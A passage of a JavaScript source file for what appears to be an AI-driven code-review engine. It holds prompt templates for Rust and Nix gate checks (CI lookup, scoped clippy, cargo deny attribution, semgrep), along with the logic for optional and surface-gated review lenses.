   SHA=$(git rev-parse HEAD)
   gh api "repos/{owner}/{repo}/commits/$SHA/pulls" --jq '.[].number'   # PRs whose head is this commit
   gh pr checks <number> --json name,state,bucket,link
   \`\`\`
   Derive owner/repo from \`git remote get-url origin\`. Also accept a PR found this way when its head SHA equals your HEAD — say so in provenance (\`via CI · PR #N · matched by SHA\`). Only if BOTH the branch and the commit lookup find nothing, or gh is missing/unauthenticated/offline, fall through to the local gate. Match generously: a check named \`cargo nextest\`, \`unit-tests\`, \`ci / test (stable)\` etc. all cover the TEST signal; \`just clippy\`, \`lint\`, \`clippy (stable)\` cover CLIPPY. A green check is the BEST evidence available — it ran on a clean machine with a warm cache and the project's real configuration. Prefer it over anything you could run here.

1b. NEVER stand up infrastructure to satisfy this gate. If a check needs a database, a container, a broker, a network service or a fixture server, that check is CI's — do not start Postgres, run \`docker\`/\`docker compose\`, apply migrations, or seed anything. Record that signal as unknown with the reason ("integration tests need Postgres; not run locally — CI owns this"). You are establishing whether a DIFF is reviewable, not reproducing the build farm. A review that never starts is worth far less than one with an unestablished test signal.
2. For build/test/clippy/fmt: if a conclusive GREEN check covers it, treat it as PASSED and record provenance "via CI #<n>". Do NOT require the check to be marked \`required\` — most repos have no branch protection at all (\`isRequired\` is then null for every check, and \`gh api …/branches/<b>/protection\` 404s), so demanding it would make this whole shortcut dead code and send you into a local build you did not need. Required-ness decides whether RED blocks a merge upstream; it says nothing about whether GREEN is trustworthy evidence — a passing job ran the project's real command on a clean machine. If a check covering fmt/clippy/test/build FAILED, set status=fail and list it in failedChecks (note whether it was required). A red check unrelated to those four is worth a line in notes, not a gate failure. Only when the signal is genuinely pending or absent, run it locally under the TIME BUDGET below.
   TAKE THE PROJECT'S LINT SEMANTICS, USE YOUR OWN SCOPE AND FORMAT. First READ the project's lint recipe — a \`clippy\`/\`lint\` target in \`justfile\`/\`Makefile\`/\`Taskfile\`, an \`[alias]\` in \`.cargo/config.toml\`, or the step its CI workflow runs (\`.github/workflows/*.yml\`) — and lift its SEMANTIC flags: the feature selection (\`--all-features\`, \`--features …\`, \`--no-default-features\`) and every \`-A\`/\`-W\`/\`-D\` lint level it sets. Those decide verdicts: a project that allows \`clippy::too_many_arguments\` will otherwise get gate failures on lints it deliberately permits, and linting the wrong feature set lints code that never ships.
   Then run it SCOPED and SHORT, which change only how much is built and how it prints, never what a lint says about a given crate:
   \`cargo clippy -p <each changed package> --all-targets --message-format=short <their feature flags> -- <their -A/-W flags> -D warnings\`
   Resolve the changed packages from the diff paths via \`cargo metadata --no-deps --format-version 1\`. Fall back to the whole workspace only when the diff genuinely spans it.
   Note the trade-off in notes: a scoped run cannot see a break this change causes in a DEPENDENT crate elsewhere in the workspace. That is CI's job — and if CI covered clippy you should not be running this at all (step 2 above). When you scope, say so, and name the packages.
   If the project defines no recipe, use \`cargo fmt --check\` and \`cargo clippy -p <changed> --all-targets --message-format=short -- -D warnings\`.
   TESTS: run them locally ONLY if CI did not cover them AND they need no infrastructure (per 1b) — and then scoped, \`cargo test -p <changed package>\`, never the whole workspace. If the changed package's tests need a service, or a bare \`cargo test\` starts pulling one up, stop and record the test signal as unknown. Do not chase a green suite; that is not what this gate is for.
3. Security tools (\`cargo audit\`, \`cargo deny\`) — usually absent from CI, so usually yours to run, but they get the SAME two rules as everything else:
   - CI COVERAGE. If preflight lists one as already green for this commit, do not re-run it. Note the sub-command: a CI job running \`cargo deny check bans\` covers bans ONLY — advisories and licenses remain yours.
   - THE PROJECT'S SCOPE, NOT THE TOOL'S DEFAULTS. Run the sub-checks the project actually configures. \`cargo deny check\` with no arguments runs advisories/bans/licenses/sources, and the unconfigured ones fall back to cargo-deny's defaults — so a \`deny.toml\` containing only \`[bans]\` will "fail" licenses and advisories on a policy the project never wrote. That is a property of the tool, not a defect in the diff. Read \`deny.toml\` (and the CI invocation) and run exactly the configured sub-checks; if a sub-check has no configuration, skip it and say so in notes rather than reporting a default-policy failure.
   - ATTRIBUTION decides which list it lands in, and only failedChecks stops the review. Check \`git diff --name-only\` against the base for \`Cargo.toml\`/\`Cargo.lock\`:
     · the diff DOES touch a dependency manifest → a vulnerability with a published fix is this change's problem: failedChecks, status=fail.
     · the diff does NOT touch one → the advisory predates this change and no edit to these files can clear it. Put it in **carriedChecks**, prefixed "PRE-EXISTING: ", and do NOT let it set status=fail. It is still reported in full — carriedChecks is printed on every verdict, not just red ones — but a gate exists to answer "is THIS DIFF reviewable", and blocking every diff in a repository on a dependency backlog it did not create means no review in that repository ever runs.
   The same attribution applies to a red \`cargo deny\` sub-check: caused by this diff → failedChecks; pre-existing → carriedChecks.
4. status = fail if any of fmt/clippy/test/build is red (CI or local), or a security check red is attributable to this diff per 3; pass if all green; unknown if you could not establish it. Anything in carriedChecks NEVER moves status — that is the whole distinction.

SEED FINDINGS (tool grounding — beyond the gate, scoped to the changed crates):
5. Pedantic seeds (a SEPARATE, optional pass — never a substitute for the gate in step 2; SKIP OUTRIGHT if preflight 0b found a compile blocker), on the SAME changed packages and the SAME feature flags you resolved there, so the two passes see the same code: \`cargo clippy -p <pkg> --all-targets --message-format=short <their feature flags> -- -W clippy::pedantic -W clippy::nursery\`. Only fall back to the whole workspace when the diff genuinely spans it. Keep the last ~200 diagnostic lines; if you truncate, SAY how many you dropped in notes — a silent cut reads as "there were only N". Turn each NEW pedantic/nursery diagnostic on changed lines into a seed finding (severity Low/Medium, source "clippy-pedantic"). Do not fail the gate on these. This step is optional: if it exceeds the budget, skip it and note that the pedantic seeds are absent.
${ctx.isLibrary ? '6. This is a library: run `cargo semver-checks check-release` if installed; each reported break is a seed finding (severity High, source "semver-checks"). If not installed, log and skip.' : '6. Not a library — skip semver-checks.'}

7. SAST seed (semgrep) — decide what configs apply, then run only if any do:
   - If a \`./semgrep/\` rules dir exists in the repo, ALWAYS include \`--config=./semgrep/\` (repo-specific banned-API/taint rules — the whole point of keeping them in-repo).
${ctx.securitySensitive
    ? '   - This diff IS security-sensitive: also include `--config=p/rust --config=p/secrets`.'
    : '   - This diff is NOT security-sensitive: do not pull the generic rulesets; rely on `./semgrep/` only (skip step 7 entirely if that dir is absent).'}
   If at least one config applies and \`semgrep\` is installed, scope it to the changed Rust files (\`git diff --name-only ${ctx.baseRef ? `--merge-base ${shq(ctx.baseRef)}` : 'HEAD'} -- '*.rs'\`) and run \`semgrep --error <configs> <files>\`. Turn each result into a seed finding (source "semgrep"; map semgrep ERROR→High, WARNING→Medium, INFO→Low). These are SEEDS, never gate failures — semgrep taint/secrets over-reports, and downstream verification refutes the false positives. If semgrep is absent or no config applies, log and skip.

${rustDepContext(ctx)}

${GATE_TIME_BUDGET}
EVIDENCE RULE: report a check as pass/fail ONLY if you ran it yourself (quote the command and its exit status / decisive output line in notes) or saw it conclusively green/red in CI (cite the check name). Never infer a pass. If the changed files are not part of a cargo project, do NOT fabricate a temporary crate/harness around them to lint or build — record build/clippy/test as not establishable (status=unknown) and say why in notes.

Set provenance to a one-line summary like "clippy/test via CI #123; fmt/audit/deny local". Put gate failures in failedChecks (NOT seedFindings). Seed findings come from clippy-pedantic / semver / semgrep / dep-context only. On every seed finding set \`ruleId\` to the matching rust-review rules.md catalog ID (e.g. "DEP-001") or "" if none fits.`
}
/** @param {Ctx} _ctx */
function nixDepContext(_ctx) {
  return `6. **Dependency context** — review against the flake inputs the project ACTUALLY pins. Resolve them from \`flake.lock\` (the locked \`rev\`/\`narHash\` per input). Flag inputs that are unpinned, channel-based (\`<nixpkgs>\`), or floating where they should be locked, and \`inputs.*.follows\` that should dedupe nixpkgs but don't (source "dep-context", severity Medium, ruleId "DEP-001"). Best-effort: skip silently if there is no flake.`
}
/** @param {Ctx} ctx */
function nixGate(ctx) {
  return `You are establishing the mechanical gate for a Nix review and collecting tool-grounded seed findings. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.

${preflightBrief(ctx.preflight)}
GATE (per the nix-review skill — load it):
0. USE THE PREFLIGHT ABOVE rather than rediscovering it: its command prefix, its blockers (a step that cannot evaluate here is skipped and reported, never run to watch it fail), its missing tools, and its ciCovers — signals already green in CI for this exact commit are cited, not re-run.
1. If a \`flake.nix\` exists: \`nix flake check\` — a failure is a gate failure (list it in failedChecks), not a seed.
2. Formatter: run \`alejandra --check .\` or \`nixpkgs-fmt --check\` (whichever the repo uses — check for a formatter in the flake / a treefmt config). Mismatches are seeds (source "fmt", Low), never a gate failure unless CI enforces fmt.
3. \`nix eval\`/\`nix build\` the attrs the diff touches — an eval or build error on changed code is a gate failure.
4. status = fail if \`nix flake check\` or an eval/build of touched attrs is red; pass if green; unknown if you could not establish it (e.g. nix not installed).

SEED FINDINGS (tool grounding — scoped to the changed files):
5. Linters — \`statix check\` (anti-idioms) and \`deadnix\` (dead bindings) on the changed \`.nix\` files. Turn each diagnostic on changed lines into a seed finding (source "statix"/"deadnix", severity Low/Medium, ruleId "MNT-001"). Do not fail the gate on these. If a linter is absent, log and skip.

${nixDepContext(ctx)}

${GATE_TIME_BUDGET}
EVIDENCE RULE: report a check as pass/fail ONLY if you ran it yourself (quote the command and its exit status / decisive output line in notes) or saw it conclusively green/red in CI. Never infer a pass; a tool you could not run is "skipped" in notes, never a pass.

Set provenance to a one-line summary like "nix flake check pass; statix/deadnix local". Put gate failures in failedChecks (NOT seedFindings). Seed findings come from statix / deadnix / fmt / dep-context only. On every seed finding set \`ruleId\` to the matching nix-review rules.md catalog ID (e.g. "MNT-001") or "" if none fits.`
}

// Admitted by a code signal, never by a floor. See `blanketLenses()` in planFor: a blanket roster fill
// says "nothing is known about this diff", which is not a reason to pay for the roster's most
// expensive lens. `failure-windows` is gated on the scout having CHOSEN `reconciler` (controller
// code); nothing else here yet, and the list exists so the next such lens has somewhere to be
// declared rather than becoming a fourth blanket exception.
const CONDITIONAL_LENSES = ['failure-windows']

// realm @nick/craft #102: each expensive whole-repo lens fires only if the diff touches the surface its defect class needs; fail-open.
// The map is lens → the `scout.surfaces` boolean that must not be affirmatively `false` for the lens
// to run. A missing surfaces object, a missing key, or `true` all KEEP the lens (see the gate in
// reviewProfile): a lens is dropped only where the scout said, in so many words, the surface is absent.
// `wireForm` names every contract another version reads, calls or deploys against (stored and wire
// data, CLI/config/env/chart surface, API/schema versions, exported names): the compat lens covers
// all of them, so a narrower surface would gate it out of the diffs it now exists for.
/** @type {Record<string, keyof NonNullable<ScoutAnswer['surfaces']>>} */
const SURFACE_GATED_LENSES = { 'negative-space': 'crossBoundarySymbol', 'compat': 'wireForm', 'invariants': 'invariantType' }

// >>> craft-inline lib/contract-paths.mjs NON_CONTRACT_DIRS PROSE_EXT isChartDir CONTRACT_PATH_CLASSES contractPathClass isContractOrSchemaPath
const NON_CONTRACT_DIRS = new Set(['test', 'tests', '__tests__', 'testdata', 'fixtures', '__fixtures__', '__snapshots__'])

const PROSE_EXT = /\.(md|mdx|markdown|rst|adoc|txt)$/i

/** @param {string} d @returns {boolean} */
function isChartDir(d) {
  return /^(charts?|helm)$/i.test(d)
}

/** @type {{ name: string, test: (p: { dirs: string[], base: string }) => boolean }[]} */
const CONTRACT_PATH_CLASSES = [
  { name: 'contracts-crate', test: p => p.dirs.some((s, i) => s === 'crates' && /^(contracts|.*-contracts)$/.test(p.dirs[i + 1] ?? '')) },
  { name: 'crd-dir', test: p => p.dirs.includes('crds') },
  { name: 'crd-manifest', test: p => /\.(ya?ml|json)$/i.test(p.base) && p.base.split(/[._-]/).some(t => /^(crds?|customresourcedefinitions?)$/i.test(t)) },
  { name: 'helm-chart', test: p => /^Chart\.ya?ml$/.test(p.base) },
  { name: 'helm-values', test: p => /^values([._-].*)?\.ya?ml$/i.test(p.base) && (p.dirs.length === 0 || p.dirs.some(isChartDir)) },
  { name: 'helm-template', test: p => /\.(ya?ml|tpl)$/i.test(p.base) && p.dirs.some((s, i) => s === 'templates' && p.dirs.slice(0, i).some(isChartDir)) },
  { name: 'openapi', test: p => /(openapi|swagger)/i.test(p.base) && /\.(ya?ml|json)$/i.test(p.base) },
  { name: 'proto', test: p => /\.proto$/i.test(p.base) },
  { name: 'graphql', test: p => /\.(graphqls?|gql)$/i.test(p.base) },
  { name: 'avro', test: p => /\.(avsc|avdl|avpr)$/i.test(p.base) },
  { name: 'json-schema', test: p => /(^|\.)schema\.json$/i.test(p.base) || /\.jsonschema$/i.test(p.base) },
  { name: 'db-migration', test: p => p.dirs.some(s => /^(migrations?|migrate|alembic)$/i.test(s)) },
  { name: 'plugin-manifest', test: p => p.dirs[p.dirs.length - 1] === '.claude-plugin' && /\.json$/i.test(p.base) },
]

/** @param {unknown} f @returns {string} */
function contractPathClass(f) {
  const segs = pathSegments(f || '')
  const base = segs[segs.length - 1] ?? ''
  const dirs = segs.slice(0, -1)
  if (!base || PROSE_EXT.test(base) || dirs.some(s => NON_CONTRACT_DIRS.has(s.toLowerCase()))) return ''
  return CONTRACT_PATH_CLASSES.find(c => c.test({ dirs, base }))?.name ?? ''
}

/** @param {unknown} f @returns {boolean} */
function isContractOrSchemaPath(f) {
  return contractPathClass(f) !== ''
}
// <<< craft-inline

// ================= The optional pass =================
// Three lenses that do not earn a place on every run. The basis is NOT equal across them: only
// `ownership` (retired, not here) has three independent counts. The two earlier store-wide counts
// named api-idioms and performance among the bottom four; `api-boundary` was not in them at all, so
// for the composition of THIS trio the basis is ONE run — one diff, one repository, one domain
// (realm @nick/craft, node #20, which requires that limit to be stated rather than dropped).
// Measured over runs of the
// budget-deterministic engine against a large Rust diff (14 lenses × 3 rounds, 215 findings):
// `performance` (15 findings, 12 of them Low/Info), `api-idioms` (14/10) and `api-boundary` (11/7)
// returned hundreds of CONFIRMED Medium-and-below findings and NOT ONE High in any of the three.
// Deleting them would make the review worse — the findings are real. Paying three full agents for
// them on every run is the part the numbers do not support. So they leave every automatic path and
// stay reachable by an explicit request.
//
// The failure mode this must not become is the one this repo keeps hitting: a run that never looked
// at performance reading as a run that found nothing wrong with it. So the skipped set is stated
// MECHANICALLY — `optionalSection()`, appended by `out()` to every report the engine can return,
// never asked of the synthesis model, which can die or simply not obey — and filed on the run
// record as `optionalPass`.
//
// STRICT MODE AND THE SECURITY FLOOR TOUCH THIS IN NEITHER DIRECTION, and that is a decision, not
// an omission.
//   · `strict` is the harsh MAINTAINABILITY bar: it forces the maintainability lens and turns its
//     confirmed findings into presumptive blockers. Letting it also buy three unrelated lenses
//     would make one flag mean two things, and would deliver the optional pass to a caller who
//     asked for something else.
//   · The security-sensitive floor expands `blanketLenses()`, and `blanketLenses()` excludes the optional set
//     exactly as it excludes CONDITIONAL_LENSES. A floor is a statement of IGNORANCE about the
//     diff, and ignorance is not a reason to buy the three lenses that measured worst.
//   · Neither may silently DISABLE it either: an explicit `optional=` request is honoured on every
//     path, including a security-floored run and a strict one. The request is the only switch.
const OPTIONAL_LENSES = ['performance', 'api-idioms', 'api-boundary']

// `optional=true` / `--optional` / `optional=all` buys the whole set; `optional=performance,api-boundary`
// (or a JSON array) buys those. Absent buys none.
// An unrecognised name is REFUSED LOUDLY rather than dropped: `optional=perf` that quietly buys
// nothing, on a run whose whole point was to buy something, is the exact silence this section exists
// to prevent — and the run would then report the lens as skipped while the caller believed otherwise.
/** The values that buy no optional lens, and those that buy the whole set (compared as `===` would). */
/** @type {unknown[]} */
const OPTIONAL_NONE = [undefined, null, '', false, 'false', 'none']
/** @type {unknown[]} */
const OPTIONAL_ALL = [true, 'true', 'all']
/** @param {unknown} raw */
function parseOptionalRequest(raw) {
  if (OPTIONAL_NONE.includes(raw)) return { lenses: [], unknown: [] }
  if (OPTIONAL_ALL.includes(raw)) return { lenses: [...OPTIONAL_LENSES], unknown: [] }
  const names = (Array.isArray(raw) ? /** @type {unknown[]} */ (raw) : String(raw).split(/[\s,]+/)).map((/** @type {unknown} */ x) => String(x).trim()).filter(Boolean)
  return { lenses: names.filter(n => OPTIONAL_LENSES.includes(n)), unknown: names.filter(n => !OPTIONAL_LENSES.includes(n)) }
}
const optionalRequest = parseOptionalRequest(A['optional'])
function warnUnknownOptional() {
  if (optionalRequest.unknown.length) {
    log(`⚠️ optional=${JSON.stringify(A['optional'])} names ${optionalRequest.unknown.join(', ')}, which is not an optional lens — the optional roster is ${OPTIONAL_LENSES.join(', ')}. Only the recognised names were admitted.`)
  }
}
warnUnknownOptional()
const optionalRequested = optionalRequest.lenses
// The optional tally is DERIVED, never accumulated. `ran`/`skipped` used to be snapshotted off the
// plan the moment it was built — but the plan is not final there: the completeness critic composes
// lenses much later, on the synthesis phase. Any such later road made the snapshot a LIE in the one
// direction that matters, printing "not looked at" over a lens whose findings were in the report.
// So the tally rests only on what cannot be second-guessed: which optional lenses each profile past
// its mechanical gate could have bought at all (its `optionalScope`, returned on `results`), and
// which ones were actually DISPATCHED (recorded by `runLens`, the single dispatch point for every
// lens on every path — planned, resurrected, or critic-composed). optionalTallyFrom
// (lib/profile-merge.mjs) subtracts, naming each lens once across profiles.
/** @type {Set<string>} */
const optionalDispatched = new Set()
// An optional lens the completeness critic named as an uncovered surface. It is NOT bought (the
// critic is the same model whose spend this pass deliberately took out of model hands), but the
// signal is real and must reach the reader rather than die in the filter.
/** @type {Set<string>} */
const optionalNamedByCritic = new Set()
const optionalTally = () => optionalTallyFrom(results, optionalDispatched, optionalRequested)
// Appended by `out()`, so it reaches every report that has a skipped list to show — the synthesized
// one and the mechanical fallback. The earliest exits (no diff) run before any profile is planned, so
// the list is empty there. A red-gated profile contributes only lenses the caller explicitly requested
// (it aborts before any lens could run), so a default run on which every profile carrying optional
// lenses is red emits no section; a passing profile on a mixed red run still contributes its whole
// scope, and the section then names the gate first. It says "absence of a result", never "no
// problems found".
const optionalSection = () => {
  const skipped = optionalTally().skipped
  if (!skipped.length) return ''
  const named = skipped.filter(l => optionalNamedByCritic.has(l))
  // A red mechanical gate blocks the whole review on its own, so "buy them with optional=…" is the
  // wrong next step there: lenses the caller already requested need no new request, and the rest are
  // beside the point until the gate is green (realm @nick/craft #109).
  if (failedProfiles(results).length) {
    const unrequested = skipped.filter(l => !optionalRequested.includes(l))
    // The critic only ever names an unrequested lens, so it is already in the one optional= offer
    // above; here it is a signal for the re-run, not a second instruction.
    const criticLine = named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was not dispatched; once the gate is green, weigh including it in that re-run.\n` : ''
    return `\n\n## Not looked at — the optional pass did not run\n⚠️ These lenses were NOT dispatched, so this review makes NO statement about what they cover: ${skipped.join(', ')}. That is an absence of a result, not a clean one. The mechanical gate is red, which blocks this review by itself — fix the gate first.${unrequested.length ? ` ${unrequested.join(', ')} ${unrequested.length === 1 ? 'is' : 'are'} off by default; add \`optional=${unrequested.join(',')}\` to the re-run only if you want ${unrequested.length === 1 ? 'it' : 'them'}.` : ''}\n` + criticLine
  }
  const criticLine = named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was still not dispatched — the optional pass is bought by an explicit request, not by a model mid-run — so buy it deliberately with \`optional=${named.join(',')}\`.\n` : ''
  return `\n\n## Not looked at — the optional pass did not run\n⚠️ These lenses were NOT dispatched, so this review makes NO statement about what they cover: ${skipped.join(', ')}. That is an absence of a result, not a clean one. They are off by default because they returned no High findings on the run that was measured — one diff of one repository, so the basis is a single point, not a settled law; to buy them, re-run with \`optional=true\` (or \`optional=${skipped.join(',')}\`).\n`
    + criticLine
}

// realm @nick/craft #102. Mirrors optionalSection(): derived from the per-profile results of
// reviewProfile's surface gate and appended by out(), so it reaches every report the engine can return, and stated
// MECHANICALLY rather than asked of the synthesis model (which can die or not obey). A whole-repo
// lens is dropped when the diff does not touch the surface its defect class needs — that is an
// ABSENCE of a result for those areas, NOT an approval of them.
// The drops themselves come back PER PROFILE on `results` (`surfaceDropped`) and are merged by
// savedSurfaceDrops (lib/profile-merge.mjs), which keeps only profiles past their gate and subtracts
// what ran elsewhere. Declared here, not where the profiles run, because out() reads it through
// surfaceGateSection() on every early exit too — where it is simply still empty.
/** @type {Result[]} */
const results = []
// The merge and the record's `gate` / `surfaceGate` fields live in lib/profile-merge.mjs (tested
// there) and are pasted in by the craft-inline gate.
// >>> craft-inline lib/profile-merge.mjs failedProfiles mergeGateStatus profilesRanLenses gateRecord passedProfiles savedSurfaceDrops surfaceGateRecord optionalTallyFrom
/**
 * @param {ProfileResult[]} results
 * @returns {ProfileResult[]}
 */
function failedProfiles(results) {
  return results.filter(r => r.gateStatus === 'fail')
}

/**
 * @param {ProfileResult[]} results
 * @returns {'fail'|'pass'|'unknown'}
 */
function mergeGateStatus(results) {
  if (failedProfiles(results).length) return 'fail'
  return results.every(r => r.gateStatus === 'pass') ? 'pass' : 'unknown'
}

/**
 * @param {ProfileResult[]} results
 * @returns {boolean}
 */
function profilesRanLenses(results) {
  return results.some(r => (r.ranLenses || []).length > 0 || (r.lensRounds || []).some(x => x.returned > 0))
}

/**
 * @param {ProfileResult[]} results
 * @returns {{status: string, provenance: string, carriedChecks: string[]}}
 */
function gateRecord(results) {
  return {
    status: mergeGateStatus(results),
    provenance: results.map(r => `[${r.profile.id}] ${r.gateProvenance}`).join(' · '),
    carriedChecks: results.flatMap(r => (r.carriedChecks || []).map(c => `[${r.profile.id}] ${c}`)),
  }
}

/**
 * @param {ProfileResult[]} results
 * @returns {ProfileResult[]}
 */
function passedProfiles(results) {
  return results.filter(r => r.gateStatus !== 'fail')
}

/**
 * @param {ProfileResult[]} results
 * @param {Iterable<string>} dispatched
 * @returns {string[]}
 */
function savedSurfaceDrops(results, dispatched) {
  const ran = new Set(dispatched)
  const dropped = new Set(passedProfiles(results).flatMap(r => r.surfaceDropped || []))
  return [...dropped].filter(l => !ran.has(l)).sort()
}

/**
 * @param {ProfileResult[]} results
 * @param {{dispatched: Iterable<string>, namedByCritic: Iterable<string>}} opts
 * @returns {{dropped: string[], dispatched: string[], namedByCritic: string[], lensesRan: boolean}}
 */
function surfaceGateRecord(results, { dispatched, namedByCritic }) {
  const dropped = savedSurfaceDrops(results, dispatched)
  const named = new Set(namedByCritic)
  return {
    dropped,
    dispatched: [...dispatched].sort(),
    namedByCritic: dropped.filter(l => named.has(l)),
    lensesRan: profilesRanLenses(results),
  }
}

/**
 * @param {ProfileResult[]} results
 * @param {Iterable<string>} dispatched
 * @param {Iterable<string>} [requested]
 * @returns {{ran: string[], skipped: string[]}}
 */
function optionalTallyFrom(results, dispatched, requested = []) {
  const ran = new Set(dispatched)
  const asked = new Set(requested)
  const passed = new Set(passedProfiles(results))
  const inScope = [...new Set(results.flatMap(r => (r.optionalScope || []).filter(l => passed.has(r) || asked.has(l))))]
  return { ran: inScope.filter(l => ran.has(l)), skipped: inScope.filter(l => !ran.has(l)) }
}
// <<< craft-inline
// Mirrors optionalDispatched: a surface-gated lens actually DISPATCHED in some profile, recorded by
// runLens (the single dispatch point on every path). The gate is a PER-PROFILE decision reading each
// profile's own scout, and negative-space is force-added to every plan — so on a mixed rust+nix diff a
// lens the gate drops in one profile can still run in another. The per-profile drops alone would then
// report a lens as saved while it actually ran, corrupting #102's savings measurement — the same
// snapshot-is-a-lie failure `optionalTally()` already fixed. savedSurfaceDrops subtracts what ran.
/** @type {Set<string>} */
const surfaceGateDispatched = new Set()
// Mirrors optionalNamedByCritic: a surface-gated lens the completeness critic named as an uncovered
// surface. It is NOT re-dispatched (the diff's absent surface is the deliberate boundary, and the
// critic is the same model whose spend this pass took out of model hands), but the signal is real and
// must reach the reader rather than die in the filter.
/** @type {Set<string>} */
const surfaceGateNamedByCritic = new Set()
// The run-level truth, DERIVED not accumulated (mirrors optionalTally): a lens counts as
// surface-gate-dropped only if the gate dropped it in a profile PAST its mechanical gate AND it ran
// in NO active profile.
const surfaceGateTally = () => ({ dropped: savedSurfaceDrops(results, surfaceGateDispatched) })
const surfaceGateSection = () => {
  const dropped = surfaceGateTally().dropped
  if (!dropped.length) return ''
  // `dropped` already subtracts what ran, so a critic-named lens that ran somewhere is not a gap.
  const named = dropped.filter(l => surfaceGateNamedByCritic.has(l))
  return `\n\n## Not run — the diff does not touch the surface these lenses need\n⚠️ These whole-repo lenses were NOT dispatched, so this review makes NO statement about what they cover: ${dropped.join(', ')}. Each fires only when the diff touches the surface its defect class needs (a cross-boundary symbol, a wire/serialized form, an invariant-bearing type), and this diff does not. That is an absence of a result, not a clean one.\n`
    + (named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was still NOT dispatched — the surface gate is the deliberate boundary, not something a model re-opens mid-run — so treat this as a visible gap, not a clean pass.\n` : '')
}

/** @type {Record<string, Profile>} */
const PROFILES = {}
PROFILES['rust'] = {
  id: 'rust',
  lang: 'Rust',
  detect: (/** @type {string[]} */ files) => files.some(f => /\.rs$/.test(f) || /(^|\/)Cargo\.toml$/.test(f)),
  diffGlobs: ["'*.rs'"],
  rubricSkill: 'rust-review',
  fpRules: 'fp-rules.md', // exclusion catalog (FP-*/KEEP-*); '' for a profile that ships none
  // Rules whose per-occurrence reporting buries the review — capped mechanically by rollupPool.
  // Only completeness nits belong here: never a rule whose individual instances carry distinct risk.
  rollupRuleIds: ['API-001', 'API-003', 'API-004', 'API-005'],
  navSkill: 'rust-navigation',
  reviewerAgent: 'craft:rust-reviewer',
  securityHints: 'auth, crypto, input parsing, unsafe, FFI, or dependencies',
  usesLibrary: true,
  alwaysLenses: ['intent'],
  safetyLens: 'safety',
  scoutRules: `Decide what is "in play" from the diff: unsafe → safety; async/threads → concurrency; SQL/untrusted input → safety; loops/collections → performance; changed \`pub\` surface → api-idioms; a changed HTTP-framework handler / route, an error enum or its IntoResponse (error→HTTP-status) mapping, an OpenAPI/response-annotation, or a repository error-mapping the handlers surface → api-boundary (web-service diffs only — pick it when the diff touches the api/handler layer or the error-to-status plumbing); new/changed tests → tests; new branching / growing files / large refactor → maintainability; a changed operation on a domain entity that carries a status/lifecycle field, soft-delete, scoped foreign keys, or a documented derived/effective quantity → invariants (pick it for any medium-or-larger diff touching the domain/application/infrastructure layers); a changed reconcile loop / controller / operator (a reconcile or requeue fn, a status or condition update, a create-or-patch of a child/external resource, a finalizer or delete path), a changed typed watch / secondary-watch setup (a \`watcher\`/\`Controller::watches\`/\`secondary_watches\`/object-mapper), or a changed admission / validating-webhook handler → reconciler (pick it whenever the diff touches a controller/reconcile loop, a retry / idempotent-apply flow, a Kubernetes typed watch, or an admission webhook — this lens reads the Helm chart's webhook \`failurePolicy\` and CRD schemas, not just the Rust); a changed serde attribute / renamed-or-retagged field or enum variant / added non-defaulted field on a type that is persisted (JSONB, blob, cache, event log, message payload) or sent over the wire, a migration renaming/retyping a column the code (de)serializes, a changed CLI flag / subcommand / exit code / output format, a changed config key / env var read / default value, a changed Helm chart value or template, a changed CRD schema or API version list, a changed proto/OpenAPI definition, or a renamed or removed exported/public name other code references → compat (pick it whenever the diff changes a contract that a party running another version reads, calls or deploys against — stored or wire data, the CLI/config/chart surface, an API/schema version, an exported name). ('intent' is enforced by the engine and added automatically — do not count it toward your choices.) \`performance\`, \`api-idioms\` and \`api-boundary\` are the OPTIONAL pass: pick them on the same signals as ever, but the engine admits them only on a run that explicitly asked for the optional pass and drops them otherwise — so do not treat their absence from a run as a judgement about the code they cover.`,
  gate: rustGate,
  depContext: rustDepContext,
  lenses: ['safety', 'errors', 'concurrency', 'performance', 'api-idioms', 'api-boundary', 'reconciler', 'failure-windows', 'compat', 'maintainability', 'tests', 'intent', 'invariants'],
  lensBrief: {
    safety: 'safety / injection / secrets: unwrap/expect/panic on reachable paths, unsafe without SAFETY, SQL/command injection, path traversal, hardcoded secrets, unbounded deserialization. Also BUILD-PROFILE DIVERGENCE (SAF-007/SAF-008), where the code you review is not the code that ships: (a) arithmetic on an untrusted-input path whose outcome differs between the dev/test profile (`overflow-checks` ON) and the shipping release profile (OFF by default — read `[profile.release]` in the crate AND workspace root before assuming, it may be re-enabled). The profile-gated panic is the FLOOR of the impact, not the ceiling: do NOT close it as "does not reproduce in release" — say what the release build does INSTEAD (a silent wrap that truncates a length, misresolves an index, or corrupts state is worse than the panic, because nothing reports it), and report both facets. (b) a `debug_assert!` carrying a load-bearing invariant — an unsafe precondition, a bounds/length check, a trust-boundary validation — which compiles out in `--release`, leaving the shipped binary unguarded.',
    errors: 'error handling: recoverable failures handled with panic/unwrap, dropped #[must_use]/error values, Result-vs-panic, typed-error-vs-anyhow at API boundaries.',
    concurrency: 'concurrency / async: blocking calls inside async, lock held across .await, unbounded channels, inconsistent lock order (deadlock), missing Send/Sync.',
    performance: 'performance: allocation in hot loops, to_string/to_owned where a borrow works, Vec::new+push where size is known, N+1 / repeated work in loops.',
    'api-idioms': 'API shape & public-surface idioms — spend the budget on impactful breaks, not per-item completeness nits. HIGH-VALUE (surface individually): public-API guideline breaks (API-006) — an unsealed trait meant to be closed, a private/unstable type or dependency leaked through a `pub` signature, an owned String/Vec/PathBuf parameter where &str/&[T]/&Path fits, a public enum/error without #[non_exhaustive], missing common-trait impls (Debug/Clone); a wildcard `_ =>` on a business enum that silently swallows new variants (API-002); a library leaking Box<dyn Error>/anyhow at its boundary (ERR-003). LOW-VALUE (do NOT file one finding per occurrence): missing `///` on a pub item (API-003), #[allow] without a justifying comment (API-004), crate-root #![deny(warnings)] (API-005), oversized fn / deep nesting (API-001) — roll repeated instances of each into ONE finding that names the pattern with a representative file:line, and raise an individual one only when it sits on a genuinely public library API, the doc is wrong or misleading (not merely absent), or the #[allow] hides a real defect.',
